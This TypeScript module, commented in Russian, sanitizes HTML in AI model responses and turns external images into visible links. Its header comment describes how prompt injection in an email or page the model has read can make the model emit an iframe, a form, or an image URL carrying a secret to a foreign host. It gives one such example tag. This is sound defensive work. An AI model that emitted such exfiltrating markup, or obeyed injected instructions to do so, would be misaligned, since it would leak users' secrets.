/**
 * Очистка HTML в ответах модели.
 *
 * Ответ рендерится через rehype-raw: инлайновый HTML из markdown попадает в
 * DOM как есть. Без фильтра модель (а через prompt injection — любое письмо
 * или страница, которые она прочитала) могла вставить в ленту `<iframe>`,
 * `<form>` или `<img src="https://чужой/?секрет">` — картинка с данными в
 * адресе грузится без клика, это классический канал утечки. Streamdown по
 * умолчанию держит здесь rehype-sanitize + rehype-harden, но свой список
 * плагинов их ЗАМЕЩАЕТ, и harden пришлось снять: он намертво блокирует
 * `file:` — ссылки на файлы песочницы (см. message.tsx). Этот модуль — замена
 * обоих: схема для sanitize и свой шаг для картинок.
 *
 * Два слоя, не один: вторым стоит CSP на edge (img-src 'self' …). Здесь
 * режем на уровне разметки, чтобы заблокированное было видно пользователю
 * ссылкой, а не пустой рамкой с ошибкой в консоли.
 */

import { defaultSchema, type Options as SanitizeSchema } from "rehype-sanitize";
import type { Element, Parent, Root, RootContent, Text } from "hast";

type Attr = NonNullable<SanitizeSchema["attributes"]>[string][number];

/**
 * Схема rehype-sanitize: дефолт GitHub + три отличия.
 *  - href: `file:` (файлы песочницы; схему потом снимает urlTransform) и
 *    `tel:` (Streamdown добавляет сам).
 *  - className у <code>: кроме `language-*` сохраняем `math-inline` и
 *    `math-display` — по ним rehype-katex (идёт ПОСЛЕ очистки) отличает
 *    формулу в строке от выключной. Дефолт их выбрасывал бы.
 *  - metastring у <code> — как у Streamdown (заголовок блока кода).
 */
export const responseSanitizeSchema: SanitizeSchema = {
  ...defaultSchema,
  protocols: {
    ...defaultSchema.protocols,
    href: [...(defaultSchema.protocols?.href ?? []), "file", "tel"],
  },
  attributes: {
    ...defaultSchema.attributes,
    code: [
      ["className", /^(language-.|math-(inline|display)$)/] as unknown as Attr,
      "metastring",
    ],
  },
};

/** Есть ли у адреса схема (`https:`, `data:` …) или он протокол-относительный
 *  (`//host/…` — браузер подставит https и уйдёт на чужой хост). */
const isForeign = (src: string): boolean =>
  /^[a-z][a-z0-9+.-]*:/i.test(src) || src.startsWith("//");

/**
 * Картинки — только свои. Относительный путь (`/outputs/x.png`, файл сессии)
 * остаётся картинкой; всё с хостом превращается в обычную ссылку с тем же
 * адресом: пользователь видит, куда ведёт, и открывает только сам, кликом.
 * Ссылка, а не пустая рамка: заблокированное должно быть видно.
 *
 * Картинка без адреса (sanitize снял `data:` и подобное) убирается совсем:
 * ChatImage рисовал бы под неё пустую рамку на высоту превью.
 *
 * Идёт после rehype-sanitize (он уже снял `javascript:` и обработчики) и до
 * urlTransform, который для ссылок внешние схемы пропускает.
 */
export function rehypeSameOriginImages() {
  return (tree: Root) => {
    const walk = (node: Parent) => {
      node.children = node.children.flatMap((child): RootContent[] => {
        if (child.type !== "element") return [child];
        if (child.tagName !== "img") {
          walk(child);
          return [child];
        }
        const src = typeof child.properties.src === "string" ? child.properties.src : "";
        if (!src) return [];
        if (!isForeign(src)) return [child];
        const alt = typeof child.properties.alt === "string" ? child.properties.alt : "";
        const text: Text = { type: "text", value: alt || src };
        const link: Element = {
          type: "element",
          tagName: "a",
          properties: { href: src },
          children: [text],
        };
        return [link];
      });
    };
    walk(tree);
  };
}
